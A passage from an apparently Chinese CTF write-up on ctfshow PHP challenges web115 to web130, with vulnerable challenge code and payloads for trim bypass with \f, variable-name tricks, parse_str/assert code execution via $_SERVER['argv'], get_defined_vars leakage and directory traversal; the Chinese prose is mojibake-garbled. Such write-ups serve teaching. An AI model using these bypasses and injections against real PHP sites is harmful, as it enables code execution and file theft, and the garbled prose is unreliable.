punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token function">filter</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"hacker!"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>ÊääfilterÊîæÂá∫Êù•‰∫ÜÔºåÁõ¥Êé•ËØª</p><h4 id="web115-fÁªïËøáis-numberic-trim"><a href="#web115-fÁªïËøáis-numberic-trim" class="headerlink" title="web115(\fÁªïËøáis_numberic()+trim())"></a>web115(\fÁªïËøáis_numberic()+trim())</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">function</span> <span class="token function-definition function">filter</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$num</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"0x"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"1"</span><span class="token punctuation">,</span><span class="token variable">$num</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$num</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"0"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"1"</span><span class="token punctuation">,</span><span class="token variable">$num</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$num</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"."</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"1"</span><span class="token punctuation">,</span><span class="token variable">$num</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$num</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"e"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"1"</span><span class="token punctuation">,</span><span class="token variable">$num</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$num</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"+"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"1"</span><span class="token punctuation">,</span><span class="token variable">$num</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token variable">$num</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$num</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'num'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token variable">$num</span><span class="token operator">!==</span><span class="token string single-quoted-string">'36'</span> <span class="token keyword">and</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token punctuation">)</span><span class="token operator">!==</span><span class="token string single-quoted-string">'36'</span> <span class="token keyword">and</span> <span class="token function">filter</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token string single-quoted-string">'36'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token operator">==</span><span class="token string single-quoted-string">'36'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"hacker!!"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"hacker!!!"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p><strong>trim()</strong> ÂáΩÊï∞ÁßªÈô§Â≠óÁ¨¶‰∏≤‰∏§‰æßÁöÑÁ©∫ÁôΩÂ≠óÁ¨¶ÊàñÂÖ∂‰ªñÈ¢ÑÂÆö‰πâÂ≠óÁ¨¶„ÄÇ</p><p>‰∏ÄËà¨ÊòØÁî®Êù•ÂéªÈô§Â≠óÁ¨¶‰∏≤È¶ñÂ∞æÂ§ÑÁöÑÁ©∫ÁôΩÂ≠óÁ¨¶ÔºàÊàñËÄÖÂÖ∂‰ªñÂ≠óÁ¨¶ÔºâÔºå‰∏ÄËà¨Âú®Áî®Âú®ÊúçÂä°Á´ØÂØπÊé•Êî∂ÁöÑÁî®Êà∑Êï∞ÊçÆËøõË°åÂ§ÑÁêÜÔºå‰ª•ÂÖçÊääÁî®Êà∑ËØØËæìÂÖ•ÁöÑÁ©∫Ê†ºÂ≠òÂÇ®Âà∞Êï∞ÊçÆÂ∫ìÔºå‰∏ãÊ¨°ÂØπÊØîÊï∞ÊçÆÊó∂ÂÄôÂá∫Èîô„ÄÇ</p><p>filterËÆ©Êàë‰ª¨Ê≤°Ê≥ïËΩ¨ËøõÂà∂ÁªïËøáÔºåËøôÈÅìÈ¢òÁöÑÂÖ≥ÈîÆÂú®‰∫éÂ¶Ç‰ΩïÁªïËøátrimÔºåÊé®ÊµãÈúÄË¶ÅÁâπÊÆäÂ≠óÁ¨¶ÔºåÊâÄ‰ª•Êàë‰ª¨ÂÜô‰∏™ËÑöÊú¨fuzz‰∏Ä‰∏ãÔºö</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">function</span> <span class="token function-definition function">filter</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$num</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"0x"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"1"</span><span class="token punctuation">,</span><span class="token variable">$num</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$num</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"0"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"1"</span><span class="token punctuation">,</span><span class="token variable">$num</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$num</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"."</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"1"</span><span class="token punctuation">,</span><span class="token variable">$num</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$num</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"e"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"1"</span><span class="token punctuation">,</span><span class="token variable">$num</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$num</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"+"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"1"</span><span class="token punctuation">,</span><span class="token variable">$num</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token variable">$num</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">&lt;</span><span class="token number">129</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$num</span><span class="token operator">=</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string single-quoted-string">'36'</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token variable">$num</span><span class="token operator">!==</span><span class="token string single-quoted-string">'36'</span> <span class="token keyword">and</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token punctuation">)</span><span class="token operator">!==</span><span class="token string single-quoted-string">'36'</span> <span class="token keyword">and</span> <span class="token function">filter</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token string single-quoted-string">'36'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token punctuation">&#125;</span></span></code></pre><p>Payload:<code>?num=%0c36</code></p><p>trimÂáΩÊï∞‰ºöËøáÊª§Á©∫Ê†º‰ª•Âèä<code>\n\r\t\v\0</code>Ôºå‰ΩÜ‰∏ç‰ºöËøáÊª§<code>\f</code></p><h4 id="web123-‰∏ãÂàíÁ∫ø-ÁªïËøá"><a href="#web123-‰∏ãÂàíÁ∫ø-ÁªïËøá" class="headerlink" title="web123(‰∏ãÂàíÁ∫ø_ÁªïËøá)"></a>web123(‰∏ãÂàíÁ∫ø_ÁªïËøá)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'argv'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$c</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'fun'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'CTF_SHOW'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">&amp;&amp;</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'CTF_SHOW.COM'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">&amp;&amp;</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'fl0g'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/\\\\|\/|\~|\`|\!|\@|\#|\%|\^|\*|\-|\+|\=|\&#123;|\&#125;|\"|\'|\,|\.|\;|\?/"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token operator">&amp;&amp;</span><span class="token variable">$c</span><span class="token operator">&lt;=</span><span class="token number">18</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>         <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"<span class="token interpolation"><span class="token variable">$c</span></span>"</span><span class="token operator">.</span><span class="token string double-quoted-string">";"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>           <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$fl0g</span><span class="token operator">===</span><span class="token string double-quoted-string">"flag_give_me"</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>             <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>         <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span> </code></pre><p>Âú®php‰∏≠ÂèòÈáèÂêçÂè™ÊúâÊï∞Â≠óÂ≠óÊØç‰∏ãÂàíÁ∫øÔºåË¢´getÊàñËÄÖpost‰º†ÂÖ•ÁöÑÂèòÈáèÂêçÔºåÂ¶ÇÊûúÂê´ÊúâÁ©∫Ê†º„ÄÅ+„ÄÅ[Âàô‰ºöË¢´ËΩ¨Âåñ‰∏∫<code>_</code>ÔºåÊâÄ‰ª•ÊåâÁêÜÊù•ËØ¥Êàë‰ª¨ÊûÑÈÄ†‰∏çÂá∫CTF_SHOW.COMËøô‰∏™ÂèòÈáè(Âõ†‰∏∫Âê´Êúâ.)Ôºå‰ΩÜphp‰∏≠Êúâ‰∏™ÁâπÊÄßÂ∞±ÊòØÂ¶ÇÊûú‰º†ÂÖ•[ÔºåÂÆÉË¢´ËΩ¨Âåñ‰∏∫<code>_</code>‰πãÂêéÔºåÂêéÈù¢ÁöÑÂ≠óÁ¨¶Â∞±‰ºöË¢´‰øùÁïô‰∏ãÊù•‰∏ç‰ºöË¢´ÊõøÊç¢</p><p>Payload:<code>CTF_SHOW=&amp;CTF[SHOW.COM=&amp;fun=echo $flag</code></p><h4 id="web125-SERVER-‚Äòargv‚Äô-ÁªïËøá"><a href="#web125-SERVER-‚Äòargv‚Äô-ÁªïËøá" class="headerlink" title="web125($_SERVER[‚Äòargv‚Äô]ÁªïËøá)"></a>web125($_SERVER[‚Äòargv‚Äô]ÁªïËøá)</h4><p>Âà©Áî®$_SERVER[‚Äòargv‚Äô]</p><blockquote><p>parse_str(ÔºâÂáΩÊï∞ÊääÊü•ËØ¢Â≠óÁ¨¶‰∏≤Ëß£ÊûêÂà∞ÂèòÈáè‰∏≠„ÄÇ<br>Ê≥®ÈáäÔºöÂ¶ÇÊûúÊú™ËÆæÁΩÆarrayÂèÇÊï∞ÔºåÂàôÁî±ËØ•ÂáΩÊï∞ËÆæÁΩÆÁöÑÂèòÈáèÂ∞ÜË¶ÜÁõñÂ∑≤Â≠òÂú®ÁöÑÂêåÂêçÂèòÈáè„ÄÇ<br>Ê≥®ÈáäÔºöphp.ini Êñá‰ª∂‰∏≠ÁöÑ magic_quotes_gpc ËÆæÁΩÆÂΩ±ÂìçËØ•ÂáΩÊï∞ÁöÑËæìÂá∫„ÄÇÂ¶ÇÊûúÂ∑≤ÂêØÁî®ÔºåÈÇ£‰πàÂú® parse_strOÔºâËß£Êûê‰πãÂâçÔºåÂèòÈáè‰ºöË¢´ addslashesOËΩ¨Êç¢„ÄÇ</p></blockquote><p>$_SERVER ÊòØ‰∏Ä‰∏™ÂåÖÂê´‰∫ÜËØ∏Â¶ÇÂ§¥‰ø°ÊÅØ(header)„ÄÅË∑ØÂæÑ(path)„ÄÅ‰ª•ÂèäËÑöÊú¨‰ΩçÁΩÆ(script locations)Á≠âÁ≠â‰ø°ÊÅØÁöÑÊï∞ÁªÑ„ÄÇËøô‰∏™Êï∞ÁªÑ‰∏≠ÁöÑÈ°πÁõÆÁî± Web ÊúçÂä°Âô®ÂàõÂª∫„ÄÇ</p><p>‚Äòargv‚Äô</p><p>‰º†ÈÄíÁªôËØ•ËÑöÊú¨ÁöÑÂèÇÊï∞ÁöÑÊï∞ÁªÑ„ÄÇÂΩìËÑöÊú¨‰ª•ÂëΩ‰ª§Ë°åÊñπÂºèËøêË°åÊó∂Ôºåargv ÂèòÈáè‰º†ÈÄíÁªôÁ®ãÂ∫è C ËØ≠Ë®ÄÊ†∑ÂºèÁöÑÂëΩ‰ª§Ë°åÂèÇÊï∞„ÄÇÂΩìÈÄöËøá GET ÊñπÂºèË∞ÉÁî®Êó∂ÔºåËØ•ÂèòÈáèÂåÖÂê´query string„ÄÇ</p><p>ÊÑèÊÄùÂ∞±ÊòØÈÄöËøá$_SERVER[‚Äòargv‚Äô]Â∞Ü$aÂèòÊàêÊï∞ÁªÑÔºåÂÜçÂà©Áî®Êï∞ÁªÑÁöÑÊÄßË¥®Â∞Üfl0g&#x3D;flag_give_me‰º†ÂÖ•ÔºåÂêåÊó∂ËøòÁªïËøáÁ¨¨‰∏Ä‰∏™if‰∏≠ÁöÑ!isset($_GET[‚Äòfl0g‚Äô]))ÔºåÁî®+Êù•ËøõË°åÂàÜÈöîÔºå‰ΩøÂæóÊï∞ÁªÑ‰∏≠ÊúâÂ§ö‰∏™Êï∞ÂÄº„ÄÇ</p><p>ÊâßË°åevalÂáΩÊï∞‰πüÂ∞±ÊòØÊâßË°å$cÂç≥ÊòØparse_str($a[1])Ôºå‰ΩøÂæófl0g&#x3D;flag_give_meÔºå‰ªéËÄåËøõÂÖ•Á¨¨‰∏â‰∏™ifËØ≠Âè•„ÄÇ</p><p>Payload:</p><blockquote><p>GET:?1&#x3D;flag.php </p><p>POST:CTF_SHOW&#x3D;&amp;CTF[SHOW.COM&#x3D;&amp;fun&#x3D;highlight_file($_GET[1])</p><p>GET:?a&#x3D;1++fl0g&#x3D;flag_give_me</p><p>POST:CTF_SHOW&#x3D;&amp;CTF[SHOW.COM&#x3D;&amp;fun&#x3D;parse_str($a[1])</p><p>GET:?a&#x3D;1++fl0g&#x3D;flag_give_me</p><p>POST:CTF_SHOW&#x3D;&amp;CTF[SHOW.COM&#x3D;&amp;fun&#x3D;assert($a[0])</p></blockquote><h4 id="web126"><a href="#web126" class="headerlink" title="web126"></a>web126</h4><p>PayloadÂêå‰∏ä</p><h4 id="web127-extractÂèòÈáèË¶ÜÁõñ-SERVER-‚ÄòQUERY-STRING‚Äô"><a href="#web127-extractÂèòÈáèË¶ÜÁõñ-SERVER-‚ÄòQUERY-STRING‚Äô" class="headerlink" title="web127(extractÂèòÈáèË¶ÜÁõñ $_SERVER[‚ÄòQUERY_STRING‚Äô])"></a>web127(extractÂèòÈáèË¶ÜÁõñ $_SERVER[‚ÄòQUERY_STRING‚Äô])</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$ctf_show</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$url</span> <span class="token operator">=</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'QUERY_STRING'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment">//ÁâπÊÆäÂ≠óÁ¨¶Ê£ÄÊµã</span><span class="token keyword">function</span> <span class="token function-definition function">waf</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/\`|\~|\!|\@|\#|\^|\*|\(|\)|\\$|\_|\-|\+|\&#123;|\;|\:|\[|\]|\&#125;|\'|\"|\&lt;|\,|\>|\.|\\\|\//'</span><span class="token punctuation">,</span> <span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">waf</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"ÂóØÂìºÔºü"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token function">extract</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$ctf_show</span><span class="token operator">===</span><span class="token string single-quoted-string">'ilove36d'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span></code></pre><p><strong>extract()</strong> ÂáΩÊï∞‰ªéÊï∞ÁªÑ‰∏≠Â∞ÜÂèòÈáèÂØºÂÖ•Âà∞ÂΩìÂâçÁöÑÁ¨¶Âè∑Ë°®„ÄÇ</p><p><code>.</code>Âíå<code>[</code>Ë¢´ËøáÊª§‰∫ÜÂèØ‰ª•‰ΩøÁî®<code> </code>(Á©∫Ê†º)Êù•ËøáÊª§</p><p>**$SERVER[‚ÄòQUERY_STRING‚Äô];**Ëé∑ÂèñÁöÑÊü•ËØ¢ËØ≠Âè•ÊòØÊúçÂä°Á´ØËøòÊ≤°urlËß£Á†Å‰πãÂâçÁöÑÂ≠óÁ¨¶‰∏≤ÔºåÊâÄ‰ª•ÂØπ<code>_</code>ËøõË°å‰∏ÄÊ¨°urlÁºñÁ†Å‰πüËÉΩÁªïËøá„ÄÇ</p><p>Payload:<code>?ctf%5fshow=ilove36d</code></p><h4 id="web128-gettext"><a href="#web128-gettext" class="headerlink" title="web128(gettext-&gt;_())"></a>web128(gettext-&gt;_())</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$f1</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'f1'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$f2</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'f2'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">check</span><span class="token punctuation">(</span><span class="token variable">$f1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token variable">$f1</span><span class="token punctuation">,</span><span class="token variable">$f2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"ÂóØÂìºÔºü"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function-definition function">check</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[0-9]|[a-z]/i'</span><span class="token punctuation">,</span> <span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span></code></pre><p><a href="https://www.cnblogs.com/lost-1987/articles/3309693.html">ÂÖ≥‰∫éphp‰∏≠gettextÁöÑÁî®Ê≥ïÔºü</a></p><p>Â∞èÁü•ËØÜÁÇπÔºö _()ÊòØ‰∏Ä‰∏™ÂáΩÊï∞</p><p><strong>_()&#x3D;&#x3D;gettext()</strong> ÊòØgettext()ÁöÑÊãìÂ±ïÂáΩÊï∞ÔºåÂºÄÂêØtextÊâ©Â±ï„ÄÇÈúÄË¶ÅphpÊâ©Â±ïÁõÆÂΩï‰∏ãÊúâphp_gettext.dll</p><p>**get_defined_vars()**ÂáΩÊï∞</p><p>get_defined_vars ‚Äî&gt;ËøîÂõûÁî±ÊâÄÊúâÂ∑≤ÂÆö‰πâÂèòÈáèÊâÄÁªÑÊàêÁöÑÊï∞ÁªÑ ËøôÊ†∑ÂèØ‰ª•Ëé∑Âæó $flag</p><p>Payload: <code>?f1=_&amp;f2=get_defined_vars</code></p><h4 id="web129-stripos-ÁõÆÂΩïÁ©øË∂ä"><a href="#web129-stripos-ÁõÆÂΩïÁ©øË∂ä" class="headerlink" title="web129(stripos  ÁõÆÂΩïÁ©øË∂ä)"></a>web129(stripos  ÁõÆÂΩïÁ©øË∂ä)</h4><pre class="language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'f'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$f</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'f'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">stripos</span><span class="token punctuation">(</span><span class="token variable">$f</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'ctfshow'</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token function">readfile</span><span class="token punctuation">(</span><span class="token variable">$f</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span> </span></code></pre><p>stripos() ÂáΩÊï∞Êü•ÊâæÂ≠óÁ¨¶‰∏≤Âú®Âè¶‰∏ÄÂ≠óÁ¨¶‰∏≤‰∏≠Á¨¨‰∏ÄÊ¨°Âá∫Áé∞ÁöÑ‰ΩçÁΩÆÔºà‰∏çÂå∫ÂàÜÂ§ßÂ∞èÂÜôÔºâ„ÄÇÂ¶ÇÊûúÊ≤°ÊúâÊâæÂà∞Â≠óÁ¨¶‰∏≤ÂàôËøîÂõû FALSE„ÄÇ</p><p><strong>Ê≥®ÈáäÔºö</strong>stripos() ÂáΩÊï∞ÊòØ‰∏çÂå∫ÂàÜÂ§ßÂ∞èÂÜôÁöÑ„ÄÇ</p><p><strong>Ê≥®ÈáäÔºö</strong>ËØ•ÂáΩÊï∞ÊòØ‰∫åËøõÂà∂ÂÆâÂÖ®ÁöÑ„ÄÇ</p><p>ÁõÆÂΩïÁ©øË∂ä</p><p>Payload:</p><blockquote><p>?f&#x3D;.&#x2F;ctfshow&#x2F;..&#x2F;flag.php</p><p>?f&#x3D;.&#x2F;ctfshow&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php </p></blockquote><h4 id="web130"><a href="#web130" class="headerlink" title="web130"></a>web130</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'f'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$f</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'f'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/.+?ctfshow/is'</span><span class="token punctuation">,</span> <span class="token variable">$f</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token 